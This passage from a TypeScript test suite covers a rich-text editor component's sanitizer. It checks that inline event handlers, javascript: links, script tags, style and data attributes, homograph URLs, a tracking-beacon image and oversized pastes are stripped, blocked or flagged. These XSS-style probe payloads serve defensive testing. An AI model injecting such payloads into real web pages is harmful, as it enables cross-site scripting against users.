          'onload',
          'onerror',
          'onmouseover',
          'onfocus',
          'onblur',
          'onchange',
          'onsubmit',
          'onkeydown',
          'onkeyup',
          'onmouseenter',
          'onmouseleave'
        ];

        for (const handler of eventHandlers) {
          el.content = `<p><span ${handler}="alert(1)">Text</span></p>`;
          await el.updateComplete;
          const output = el.toHTML();
          expect(output.toLowerCase()).to.not.include(handler);
        }
      });

      it('should always remove inline style attributes', async () => {
        const el = await fixture<RichTextContextComponent>(html`
          <forge-rich-text-context allow-paste-formatting></forge-rich-text-context>
        `);
        await new Promise(resolve => setTimeout(resolve, 100));

        el.content = '<p style="background:url(javascript:alert(1))">Text</p>';
        await el.updateComplete;

        const output = el.toHTML();
        expect(output.toLowerCase()).to.not.include('style=');
      });

      it('should always remove data-* attributes', async () => {
        const el = await fixture<RichTextContextComponent>(html`
          <forge-rich-text-context allow-paste-formatting></forge-rich-text-context>
        `);
        await new Promise(resolve => setTimeout(resolve, 100));

        el.content = '<p data-payload="malicious" data-track="user">Text</p>';
        await el.updateComplete;

        const output = el.toHTML();
        expect(output).to.not.include('data-payload');
        expect(output).to.not.include('data-track');
      });
    });

    describe('Security Warnings - Must Always Log', () => {
      it('should log warnings when blocking dangerous protocols', async () => {
        const warnSpy = sinon.spy(console, 'warn');

        try {
          const el = await fixture<RichTextContextComponent>(html`
            <forge-rich-text-context></forge-rich-text-context>
          `);
          await new Promise(resolve => setTimeout(resolve, 100));

          (el as any).content = {
            type: 'doc',
            content: [
              {
                type: 'paragraph',
                content: [
                  {
                    type: 'text',
                    text: 'Link',
                    marks: [{ type: 'link', attrs: { href: 'javascript:alert(1)' } }]
                  }
                ]
              }
            ]
          };
          await el.updateComplete;

          // Should have logged a security warning
          expect(warnSpy.calledWith(sinon.match(/Blocked dangerous protocol/))).to.be.true;
        } finally {
          warnSpy.restore();
        }
      });

      it('should log errors when content sanitization fails', async () => {
        const el = await fixture<RichTextContextComponent>(html` <forge-rich-text-context></forge-rich-text-context> `);
        await new Promise(resolve => setTimeout(resolve, 100));

        // Stop propagation so WTR doesn't treat the dispatched 'error' event as uncaught.
        const rteErrors: string[] = [];
        el.addEventListener('error', (e: Event) => {
          rteErrors.push((e as CustomEvent).detail?.error ?? '');
          e.stopPropagation();
        });

        const errorSpy = sinon.spy(console, 'error');
        try {
          // Circular reference — structuredClone throws DataCloneError
          const circular: any = { type: 'doc', content: [] };
          circular.content.push(circular);
          (el as any).content = circular;
          await el.updateComplete;

          // Should have logged an error AND dispatched an error event
          expect(errorSpy.called).to.be.true;
          expect(rteErrors.length).to.be.greaterThan(0);
        } finally {
          errorSpy.restore();
        }
      });
    });

    describe('No Bypass Mechanisms - Security Cannot Be Disabled', () => {
      it('should have no way to disable HTML entity escaping', async () => {
        const el = await fixture<RichTextContextComponent>(html` <forge-rich-text-context></forge-rich-text-context> `);
        await new Promise(resolve => setTimeout(resolve, 100));

        // Verify no public properties or methods that could disable sanitization
        expect((el as any).disableSanitization).to.be.undefined;
        expect((el as any).unsafeHTML).to.be.undefined;
        expect((el as any).skipValidation).to.be.undefined;
        expect((el as any).allowUnsafeProtocols).to.be.undefined;
      });

      it('should have no way to disable protocol validation', async () => {
        const el = await fixture<RichTextContextComponent>(html`
          <forge-rich-text-context>
            <forge-rte-link></forge-rte-link>
          </forge-rich-text-context>
        `);
        await new Promise(resolve => setTimeout(resolve, 100));

        const link = el.querySelector('forge-rte-link') as RichTextFeatureLinkComponent;

        // Verify properties that could disable security don't exist
        expect(link).to.not.have.property('validateUrls');
        expect(link).to.not.have.property('allowDangerousProtocols');
        expect(link).to.not.have.property('skipValidation');
      });

      it('should have no way to suppress security warnings', async () => {
        const el = await fixture<RichTextContextComponent>(html` <forge-rich-text-context></forge-rich-text-context> `);
        await new Promise(resolve => setTimeout(resolve, 100));

        expect(el).to.not.have.property('suppressErrors');
        expect(el).to.not.have.property('suppressWarnings');
        expect(el).to.not.have.property('silentMode');
      });

      it('should have no way to disable JSON sanitization', async () => {
        const el = await fixture<RichTextContextComponent>(html` <forge-rich-text-context></forge-rich-text-context> `);
        await new Promise(resolve => setTimeout(resolve, 100));

        expect((el as any).skipJSONValidation).to.be.undefined;
        expect((el as any).trustContent).to.be.undefined;
        expect((el as any).unsafeMode).to.be.undefined;
      });

      it('should have no way to bypass depth or node limits', async () => {
        const el = await fixture<RichTextContextComponent>(html` <forge-rich-text-context></forge-rich-text-context> `);
        await new Promise(resolve => setTimeout(resolve, 100));

        expect((el as any).maxDepth).to.be.undefined;
        expect((el as any).maxNodes).to.be.undefined;
        expect((el as any).unlimitedNesting).to.be.undefined;
      });
    });

    describe('Security Finding #8 - Paste Size DoS Protection', () => {
      it('should handle extremely large pasted content without hanging', async () => {
        const el = await fixture<RichTextContextComponent>(html` <forge-rich-text-context></forge-rich-text-context> `);
        await new Promise(resolve => setTimeout(resolve, 100));

        const warnSpy = sinon.spy(console, 'warn');

        try {
          // Create a 2MB HTML string
          const huge = '<p>' + 'text '.repeat(400_000) + '</p>';
          expect(huge.length).to.be.greaterThan(1_000_000);

          // This should truncate and warn, not hang
          el.content = huge;
          await el.updateComplete;

          // Should have logged a warning about truncation
          expect(warnSpy.calledWith(sinon.match(/HTML content too large/))).to.be.true;
        } finally {
          warnSpy.restore();
        }
      });

      it('should allow content under 1MB without warning', async () => {
        const el = await fixture<RichTextContextComponent>(html` <forge-rich-text-context></forge-rich-text-context> `);
        await new Promise(resolve => setTimeout(resolve, 100));

        const warnSpy = sinon.spy(console, 'warn');

        try {
          // Create a 500KB HTML string (under limit)
          const acceptable = '<p>' + 'text '.repeat(100_000) + '</p>';
          expect(acceptable.length).to.be.lessThan(1_000_000);

          el.content = acceptable;
          await el.updateComplete;

          // Should NOT warn about size
          expect(warnSpy.calledWith(sinon.match(/HTML content too large/))).to.be.false;
        } finally {
          warnSpy.restore();
        }
      });
    });

    describe('Unicode Homograph Attack Detection', () => {
      async function triggerValidation(link: RichTextFeatureLinkComponent, url: string): Promise<void> {
        const input = link.shadowRoot?.querySelector('input') as HTMLInputElement;
        if (input) {
          Object.defineProperty(input, 'value', { value: url, writable: true, configurable: true });
          input.dispatchEvent(new Event('input', { bubbles: true }));
        } else {
          // Fallback: set internal state directly and trigger update
          (link as any)._linkUrl = url;
          await link.updateComplete;
        }
        await link.updateComplete;
      }

      it('should warn on Cyrillic characters in URL', async () => {
        const el = await fixture<RichTextContextComponent>(html`
          <forge-rich-text-context>
            <forge-rte-link></forge-rte-link>
          </forge-rich-text-context>
        `);
        await new Promise(resolve => setTimeout(resolve, 100));

        const link = el.querySelector('forge-rte-link') as RichTextFeatureLinkComponent;

        // Use Cyrillic 'е' (U+0435) instead of Latin 'e' (U+0065) — now a non-blocking warning
        (link as any)._linkUrl = 'https://еxample.com';
        await link.updateComplete;
        await triggerValidation(link, 'https://еxample.com');

        // IDN is a warning, not a blocking error
        expect((link as any)._validationWarning).to.include('Warning');
        expect((link as any)._validationError).to.equal('');
      });

      it('should warn on punycode (xn--) domains', async () => {
        const el = await fixture<RichTextContextComponent>(html`
          <forge-rich-text-context>
            <forge-rte-link></forge-rte-link>
          </forge-rich-text-context>
        `);
        await new Promise(resolve => setTimeout(resolve, 100));

        const link = el.querySelector('forge-rte-link') as RichTextFeatureLinkComponent;

        await triggerValidation(link, 'https://xn--xample-9ua.com');

        // IDN is a warning, not a blocking error
        expect((link as any)._validationWarning).to.include('Warning');
        expect((link as any)._validationError).to.equal('');
      });

      it('should allow ASCII URLs without warning', async () => {
        const el = await fixture<RichTextContextComponent>(html`
          <forge-rich-text-context>
            <forge-rte-link></forge-rte-link>
          </forge-rich-text-context>
        `);
        await new Promise(resolve => setTimeout(resolve, 100));

        const link = el.querySelector('forge-rte-link') as RichTextFeatureLinkComponent;

        await triggerValidation(link, 'https://example.com');

        expect((link as any)._validationError).to.equal('');
        expect((link as any)._validationWarning).to.equal('');
      });

      it('should warn on mixed scripts (Greek, Arabic, etc)', async () => {
        const el = await fixture<RichTextContextComponent>(html`
          <forge-rich-text-context>
            <forge-rte-link></forge-rte-link>
          </forge-rich-text-context>
        `);
        await new Promise(resolve => setTimeout(resolve, 100));

        const link = el.querySelector('forge-rte-link') as RichTextFeatureLinkComponent;

        // Greek letters that look like Latin — IDN is a warning, not a blocking error
        await triggerValidation(link, 'https://gοοgle.com'); // Greek omicron (ο)

        expect((link as any)._validationWarning).to.include('Warning');
        expect((link as any)._validationError).to.equal('');
      });
    });

    describe('URL Length Validation', () => {
      async function triggerValidation(link: RichTextFeatureLinkComponent, url: string): Promise<void> {
        (link as any)._linkUrl = url;
        await link.updateComplete;
        const input = link.shadowRoot?.querySelector('input') as HTMLInputElement;
        if (input) {
          Object.defineProperty(input, 'value', { value: url, writable: true, configurable: true });
          input.dispatchEvent(new Event('input', { bubbles: true }));
          await link.updateComplete;
        }
      }

      it('should reject extremely long URLs', async () => {
        const el = await fixture<RichTextContextComponent>(html`
          <forge-rich-text-context>
            <forge-rte-link></forge-rte-link>
          </forge-rich-text-context>
        `);
        await new Promise(resolve => setTimeout(resolve, 100));

        const link = el.querySelector('forge-rte-link') as RichTextFeatureLinkComponent;

        // Create URL over 2048 characters
        await triggerValidation(link, 'https://example.com/' + 'a'.repeat(2100));

        expect((link as any)._validationError).to.include('URL too long');
        expect((link as any)._validationError).to.include('2048');
      });

      it('should allow URLs under the length limit', async () => {
        const el = await fixture<RichTextContextComponent>(html`
          <forge-rich-text-context>
            <forge-rte-link></forge-rte-link>
          </forge-rich-text-context>
        `);
        await new Promise(resolve => setTimeout(resolve, 100));

        const link = el.querySelector('forge-rte-link') as RichTextFeatureLinkComponent;

        // Create URL under 2048 characters
        await triggerValidation(link, 'https://example.com/' + 'a'.repeat(2000));

        expect((link as any)._validationError).to.equal('');
      });

      it('should reject URL exactly at 2049 characters', async () => {
        const el = await fixture<RichTextContextComponent>(html`
          <forge-rich-text-context>
            <forge-rte-link></forge-rte-link>
          </forge-rich-text-context>
        `);
        await new Promise(resolve => setTimeout(resolve, 100));

        const link = el.querySelector('forge-rte-link') as RichTextFeatureLinkComponent;

        // Create URL exactly at 2049 (1 over limit)
        const url = 'https://example.com/' + 'a'.repeat(2029);
        expect(url.length).to.equal(2049);

        await triggerValidation(link, url);

        expect((link as any)._validationError).to.include('URL too long');
      });
    });
  });

  describe('Red-team followup fixes', () => {
    describe('Initial content property loads and is sanitized', () => {
      it('should render declarative content set before mount', async () => {
        // forge-rich-text-context needs forge-rich-text-content to provide the editor element
        const el = await fixture<RichTextContextComponent>(html`
          <forge-rich-text-context content="<p>Hello initial</p>">
            <forge-rich-text-content></forge-rich-text-content>
          </forge-rich-text-context>
        `);
        await new Promise(resolve => setTimeout(resolve, 150));

        const output = el.toHTML();
        expect(output).to.include('Hello initial');
      });

      it('should sanitize dangerous content in the initial content property', async () => {
        const el = await fixture<RichTextContextComponent>(html`
          <forge-rich-text-context content="<p>safe</p><script>alert(1)</script>">
            <forge-rich-text-content></forge-rich-text-content>
          </forge-rich-text-context>
        `);
        await new Promise(resolve => setTimeout(resolve, 150));

        const output = el.toHTML();
        expect(output).to.include('safe');
        expect(output).to.not.include('<script>');
      });
    });

    describe('Renderer initial content is sanitized', () => {
      it('should sanitize initial content in the renderer', async () => {
        const malicious = {
          type: 'doc',
          content: [
            {
              type: 'paragraph',
              content: [
                {
                  type: 'text',
                  text: 'safe',
                  marks: [{ type: 'link', attrs: { href: 'javascript:alert(1)' } }]
                }
              ]
            }
          ]
        };

        const el = await fixture<RichTextRendererComponent>(html`
          <forge-rich-text-renderer .content=${malicious}></forge-rich-text-renderer>
        `);
        await new Promise(resolve => setTimeout(resolve, 150));

        // Verify the link href was neutralized on initial render
        const link = el.shadowRoot?.querySelector('a');
        expect(link?.getAttribute('href')).to.not.include('javascript:');
      });
    });

    describe('JSON sanitizer does not mutate caller object', () => {
      it('should not mutate caller JSON when sanitizing dangerous href', async () => {
        const dangerousJson = {
          type: 'doc',
          content: [
            {
              type: 'paragraph',
              content: [
                {
                  type: 'text',
                  text: 'link',
                  marks: [{ type: 'link', attrs: { href: 'javascript:alert(1)' } }]
                }
              ]
            }
          ]
        };

        const originalHref = dangerousJson.content[0].content[0].marks[0].attrs.href;

        const el = await fixture<RichTextContextComponent>(html` <forge-rich-text-context></forge-rich-text-context> `);
        await new Promise(resolve => setTimeout(resolve, 100));

        // Trigger sanitization via willUpdate path — content is public but typed as string,
        // so we cast the JSON through unknown to match the property signature
        el.content = dangerousJson as unknown as string;
        await el.updateComplete;

        // Caller's original object must be unchanged
        expect(dangerousJson.content[0].content[0].marks[0].attrs.href).to.equal(originalHref);
      });
    });

    describe('Sanitizers use DOMParser (no eager img fetch)', () => {
      it('should not set img src attribute before element removal', async () => {
        const spy = sinon.spy(HTMLImageElement.prototype, 'setAttribute');
        try {
          const el = await fixture<RichTextContextComponent>(html`
            <forge-rich-text-context></forge-rich-text-context>
          `);
          await new Promise(resolve => setTimeout(resolve, 100));

          // Setting content with an img should NOT trigger setAttribute('src', ...) eagerly
          el.content = '<p>text</p><img src="http://beacon.example.com/track">';
          await el.updateComplete;

          const srcCalls = spy.args.filter(args => args[0] === 'src' && String(args[1]).includes('beacon'));
          expect(srcCalls).to.have.lengthOf(0);
        } finally {
          spy.restore();
        }
      });
    });

    describe('Protocol blocklist uses startsWith (no over-blocking)', () => {
      async function triggerLinkValidation(link: RichTextFeatureLinkComponent, url: string): Promise<void> {
        (link as any)._linkUrl = url;
        await link.updateComplete;
        const input = link.shadowRoot?.querySelector('input') as HTMLInputElement;
        if (input) {
          Object.defineProperty(input, 'value', { value: url, writable: true, configurable: true });
          input.dispatchEvent(new Event('input', { bubbles: true }));
          await link.updateComplete;
        }
      }

      it('should allow URLs with about:blank in query params', async () => {
        const el = await fixture<RichTextContextComponent>(html`
          <forge-rich-text-context>
            <forge-rte-link></forge-rte-link>
          </forge-rich-text-context>
        `);
        await new Promise(resolve => setTimeout(resolve, 100));

        const link = el.querySelector('forge-rte-link') as RichTextFeatureLinkComponent;
        await triggerLinkValidation(link, 'https://x.com/?next=about:blank');

        // Should not be blocked — about:blank is in query params, not the protocol position
        expect((link as any)._validationError).to.equal('');
      });

      it('should still block javascript: protocol', async () => {
        const el = await fixture<RichTextContextComponent>(html`
          <forge-rich-text-context>
            <forge-rte-link></forge-rte-link>
          </forge-rich-text-context>
        `);
        await new Promise(resolve => setTimeout(resolve, 100));

        const link = el.querySelector('forge-rte-link') as RichTextFeatureLinkComponent;
        await triggerLinkValidation(link, 'javascript:alert(1)');

        expect((link as any)._validationError).to.include('Invalid protocol');
      });
    });

    describe('IDN URLs show non-blocking warning', () => {
      async function triggerLinkValidation(link: RichTextFeatureLinkComponent, url: string): Promise<void> {
        (link as any)._linkUrl = url;
        await link.updateComplete;
        const input = link.shadowRoot?.querySelector('input') as HTMLInputElement;
        if (input) {
          Object.defineProperty(input, 'value', { value: url, writable: true, configurable: true });
          input.dispatchEvent(new Event('input', { bubbles: true }));
          await link.updateComplete;
        }
      }

      it('should set a warning but not an error for punycode IDN URL', async () => {
        const el = await fixture<RichTextContextComponent>(html`
          <forge-rich-text-context>
            <forge-rte-link></forge-rte-link>
          </forge-rich-text-context>
        `);
        await new Promise(resolve => setTimeout(resolve, 100));

        const link = el.querySelector('forge-rte-link') as RichTextFeatureLinkComponent;
        await triggerLinkValidation(link, 'https://xn--e1afmkfd.xn--80akhbyknj4f/path');

        // Error should be empty so Apply is enabled
        expect((link as any)._validationError).to.equal('');
        // Warning should be set
        expect((link as any)._validationWarning).to.include('Warning');
      });
    });

    describe('Fix #9 — adding feature after mount does not wipe content', () => {
      it('should not re-initialize editor when editor already exists', async () => {
        const el = await fixture<RichTextContextComponent>(html`
          <forge-rich-text-context>
            <forge-rich-text-content></forge-rich-text-content>
          </forge-rich-text-context>
        `);
        await new Promise(resolve => setTimeout(resolve, 150));

        // Set some content via the editor directly
        el.editorContext.editor?.commands.setContent('<p>user content</p>');
        await new Promise(resolve => setTimeout(resolve, 50));

        const editorBefore = el.editorContext.editor;

        // Simulate a late feature registration via the public context API
        el.editorContext.registerFeature({ extensions: [], requestUpdate: () => {} });
        await new Promise(resolve => setTimeout(resolve, 100));

        // Editor instance should be the same — no re-init
        expect(el.editorContext.editor).to.equal(editorBefore);
        expect(el.toHTML()).to.include('user content');
      });
    });
  });
});
